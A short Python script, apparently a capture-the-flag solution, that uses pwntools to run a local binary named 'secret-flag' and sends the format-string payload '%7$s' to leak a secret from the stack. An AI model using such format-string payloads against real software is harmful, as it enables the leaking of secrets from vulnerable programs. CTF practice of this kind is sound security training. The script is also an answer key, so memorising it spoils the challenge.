from pwn import *

p = process("./bin/secret-flag")

p.sendlineafter("?", "%7$s")

p.interactive()
